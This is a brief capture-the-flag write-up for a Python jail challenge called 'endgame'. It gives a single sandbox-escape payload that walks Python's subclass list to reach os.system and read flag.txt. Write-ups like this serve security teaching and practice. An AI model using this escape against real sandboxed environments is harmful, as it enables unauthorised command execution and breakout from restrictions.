Title: endgame

Description:
```
Crack the last one in pyjail series! Author : Claire de lune
```

Refer to the first [challenge](https://github.com/Coder-Here/ShaktiCTF/blob/main/Misc/level0/README.md), the payload works from there.

```
print([].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['system']('cat flag.txt'))
```

Flag: 
